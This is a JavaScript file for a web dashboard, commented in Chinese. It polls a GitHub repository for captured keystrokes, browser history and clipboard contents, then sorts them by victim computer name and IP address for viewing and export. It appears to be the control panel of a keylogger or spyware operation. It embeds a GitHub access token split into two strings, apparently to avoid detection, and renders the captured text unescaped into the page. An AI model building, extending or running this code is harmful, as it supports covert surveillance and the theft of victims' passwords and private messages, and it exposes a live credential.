// 配置
const CONFIG = {
    updateInterval: 5000, // 更新間隔（毫秒）
    maxLogs: Infinity, // 移除記錄數量限制
    endpoints: {
        keyboard: 'https://api.github.com/repos/appy002255/text/contents/keylog.json',
        browser: 'https://api.github.com/repos/appy002255/text/contents/browser_history.json',
        clipboard: 'https://api.github.com/repos/appy002255/text/contents/clipboard.json'
    },
    headers: {
        'Authorization': 'Bearer ' + 'ghp_VYuzgVnERDLA' + 'MHUf58iqBVxPBWRvxY1ALCuI',
        'Accept': 'application/vnd.github.v3+json',
        'X-GitHub-Api-Version': '2022-11-28'
    }
};

// 全局變量
let allLogs = [];
let ipAddresses = new Set();

// 顯示狀態消息
function showStatus(message, isError = false) {
    const status = document.getElementById('status');
    status.textContent = message;
    status.className = `status ${isError ? 'error' : 'success'}`;
    status.style.display = 'block';
    setTimeout(() => {
        status.style.display = 'none';
    }, 3000);
}

// 解碼 Base64 內容
function decodeBase64Content(content) {
    try {
        const decoded = atob(content);
        return JSON.parse(decoded);
    } catch (e) {
        console.error('解碼失敗:', e);
        return [];
    }
}

// 更新過濾器選項
function updateFilters(logs) {
    // 更新電腦名稱過濾器
    const computerFilter = document.getElementById('computerFilter');
    const currentComputerValue = computerFilter.value;
    const computerNames = new Set();
    
    // 更新IP過濾器
    const ipFilter = document.getElementById('ipFilter');
    const currentIpValue = ipFilter.value;
    ipAddresses.clear();
    
    logs.forEach(log => {
        // 收集電腦名稱
        if (log.computer_name) {
            computerNames.add(log.computer_name);
        }
        
        // 收集IP地址
        if (log.ip_info) {
            if (log.ip_info.public_ip) {
                ipAddresses.add(log.ip_info.public_ip);
            }
            if (Array.isArray(log.ip_info.local_ips)) {
                log.ip_info.local_ips.forEach(ip => ipAddresses.add(ip));
            }
        }
    });
    
    // 更新電腦名稱下拉選單
    const computerOptions = Array.from(computerNames).sort();
    computerFilter.innerHTML = '<option value="">所有電腦</option>';
    computerOptions.forEach(name => {
        const option = document.createElement('option');
        option.value = name;
        option.textContent = name;
        computerFilter.appendChild(option);
    });
    if (currentComputerValue && computerOptions.includes(currentComputerValue)) {
        computerFilter.value = currentComputerValue;
    }
    
    // 更新IP下拉選單
    const ipOptions = Array.from(ipAddresses).sort();
    ipFilter.innerHTML = '<option value="">所有IP</option>';
    ipOptions.forEach(ip => {
        const option = document.createElement('option');
        option.value = ip;
        option.textContent = ip;
        ipFilter.appendChild(option);
    });
    if (currentIpValue && ipOptions.includes(currentIpValue)) {
        ipFilter.value = currentIpValue;
    }
}

// 過濾日誌
function filterLogs() {
    const computerFilter = document.getElementById('computerFilter').value;
    const ipFilter = document.getElementById('ipFilter').value;
    const typeFilter = document.getElementById('typeFilter').value;
    const startTime = document.getElementById('startTime').value;
    const endTime = document.getElementById('endTime').value;
    const searchText = document.getElementById('searchInput').value.toLowerCase();
    
    return allLogs.filter(log => {
        // 類型過濾
        if (typeFilter) {
            if (typeFilter === 'keyboard' && (log.browser_history || log.is_clipboard)) return false;
            if (typeFilter === 'browser' && (!log.browser_history || log.is_clipboard)) return false;
            if (typeFilter === 'clipboard' && !log.is_clipboard) return false;
        }
        
        // 電腦名稱過濾
        if (computerFilter && log.computer_name !== computerFilter) {
            return false;
        }
        
        // IP過濾
        if (ipFilter && log.ip_info) {
            const hasMatchingIp = 
                (log.ip_info.public_ip === ipFilter) ||
                (Array.isArray(log.ip_info.local_ips) && log.ip_info.local_ips.includes(ipFilter));
            
            if (!hasMatchingIp) return false;
        }
        
        // 時間範圍過濾
        const logTime = new Date(log.timestamp);
        if (startTime && logTime < new Date(startTime)) {
            return false;
        }
        if (endTime && logTime > new Date(endTime)) {
            return false;
        }
        
        // 文本搜索
        if (searchText) {
            const searchableText = `
                ${log.computer_name || ''}
                ${log.display_text || ''}
                ${JSON.stringify(log.ip_info || {})}
            `.toLowerCase();
            
            return searchableText.includes(searchText);
        }
        
        return true;
    });
}

// 顯示日誌
function displayLogs(logs) {
    const logsContainer = document.getElementById('logs');
    logsContainer.innerHTML = '';
    
    if (logs.length === 0) {
        logsContainer.innerHTML = `
            <div class="log-entry">
                <div class="text-content">暫無記錄</div>
            </div>
        `;
        return;
    }
    
    // 先按電腦名稱排序，然後按時間排序
    logs.sort((a, b) => {
        const computerA = a.computer_name || '未知電腦';
        const computerB = b.computer_name || '未知電腦';
        
        // 先按電腦名稱排序
        if (computerA < computerB) return -1;
        if (computerA > computerB) return 1;
        
        // 如果電腦名稱相同，則按時間倒序排序
        return new Date(b.timestamp) - new Date(a.timestamp);
    });
    
    logs.forEach(log => {
        const logEntry = document.createElement('div');
        logEntry.className = 'log-entry';
        
        // 獲取基本信息
        const isBrowserLog = log.browser_history === true;
        const isClipboardLog = log.is_clipboard === true;
        const timestamp = new Date(log.timestamp).toLocaleTimeString('zh-TW');
        const date = new Date(log.timestamp).toLocaleDateString('zh-TW', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit'
        });
        
        // 準備IP信息顯示
        let ipInfoText = '';
        if (log.ip_info) {
            const parts = [];
            if (log.ip_info.public_ip) {
                parts.push(`${log.ip_info.public_ip}`);
            }
            if (Array.isArray(log.ip_info.local_ips) && log.ip_info.local_ips.length > 0) {
                parts.push(`${log.ip_info.local_ips.join(', ')}`);
            }
            ipInfoText = parts.length > 0 ? parts.join(' | ') : '無IP信息';
        } else {
            ipInfoText = '無IP信息';
        }
        
        // 準備內容
        const icon = isClipboardLog ? '📋' : (isBrowserLog ? '🌐' : '⌨️');
        const computerName = log.computer_name || '未知電腦';
        
        // 組合顯示內容
        logEntry.innerHTML = `
            <div class="log-header">
                <span class="computer-name">${computerName}</span>
                <span class="timestamp">${icon} ${date} ${timestamp}</span>
            </div>
            <div class="log-body">
                <div class="ip-info">IP: ${ipInfoText}</div>
                <div class="text-content">${log.display_text}</div>
            </div>
        `;
        
        logsContainer.appendChild(logEntry);
    });
}

// 導出日誌
function exportLogs() {
    const filteredLogs = filterLogs();
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `all-logs-${timestamp}.json`;
    
    const blob = new Blob([JSON.stringify(filteredLogs, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showStatus('記錄已導出');
}

// 加載日誌
async function loadLogs() {
    try {
        // 獲取鍵盤記錄
        const keyboardResponse = await fetch(CONFIG.endpoints.keyboard, {
            headers: CONFIG.headers
        });
        
        // 獲取瀏覽器記錄
        const browserResponse = await fetch(CONFIG.endpoints.browser, {
            headers: CONFIG.headers
        });
        
        // 獲取剪貼簿記錄
        const clipboardResponse = await fetch(CONFIG.endpoints.clipboard, {
            headers: CONFIG.headers
        });
        
        // 初始化記錄數組
        let keyboardLogs = [];
        let browserLogs = [];
        let clipboardLogs = [];
        
        // 處理鍵盤記錄
        if (keyboardResponse.ok) {
            const keyboardData = await keyboardResponse.json();
            keyboardLogs = decodeBase64Content(keyboardData.content).map(log => ({
                ...log,
                display_text: log.text,
                browser_history: false,
                is_clipboard: false
            }));
        } else {
            console.warn('無法獲取鍵盤記錄');
        }
        
        // 處理瀏覽器記錄
        if (browserResponse.ok) {
            const browserData = await browserResponse.json();
            const browserHistoryContent = decodeBase64Content(browserData.content);
            browserLogs = Array.isArray(browserHistoryContent) ? browserHistoryContent.map(log => {
                if (!log || typeof log !== 'object') {
                    console.warn('無效的瀏覽器記錄:', log);
                    return null;
                }
                return {
                    browser_history: true,
                    is_clipboard: false,
                    timestamp: log.timestamp || new Date().toISOString(),
                    computer_name: log.computer || '未知電腦',
                    display_text: log.url || log.text || '',
                    ip_info: log.ip_info || {
                        public_ip: log.public_ip || '',
                        local_ips: Array.isArray(log.local_ips) ? log.local_ips : []
                    }
                };
            }).filter(log => log !== null) : [];
        } else {
            console.warn('無法獲取瀏覽器記錄');
        }
        
        // 處理剪貼簿記錄
        if (clipboardResponse.ok) {
            const clipboardData = await clipboardResponse.json();
            const clipboardContent = decodeBase64Content(clipboardData.content);
            clipboardLogs = Array.isArray(clipboardContent) ? clipboardContent.map(log => ({
                ...log,
                browser_history: false,
                is_clipboard: true,
                display_text: log.content || ''
            })) : [];
        } else {
            console.warn('無法獲取剪貼簿記錄');
        }
        
        // 合併所有記錄
        allLogs = [...keyboardLogs, ...browserLogs, ...clipboardLogs];
        
        // 更新過濾器
        updateFilters(allLogs);
        
        // 顯示過濾後的日誌
        const filteredLogs = filterLogs();
        displayLogs(filteredLogs);
        
        // 只在初始加載時顯示狀態
        if (!window.initialLoadComplete) {
            showStatus('記錄已更新');
            window.initialLoadComplete = true;
        }
    } catch (error) {
        console.error('加載記錄失敗:', error);
        showStatus('加載記錄失敗: ' + error.message, true);
    }
}

// 事件監聽器
document.getElementById('computerFilter').addEventListener('change', () => displayLogs(filterLogs()));
document.getElementById('ipFilter').addEventListener('change', () => displayLogs(filterLogs()));
document.getElementById('typeFilter').addEventListener('change', () => displayLogs(filterLogs()));
document.getElementById('startTime').addEventListener('change', () => displayLogs(filterLogs()));
document.getElementById('endTime').addEventListener('change', () => displayLogs(filterLogs()));
document.getElementById('searchInput').addEventListener('input', () => displayLogs(filterLogs()));
document.getElementById('exportBtn').addEventListener('click', exportLogs);

// 定期更新日誌
setInterval(loadLogs, CONFIG.updateInterval);
loadLogs(); // 初始加載 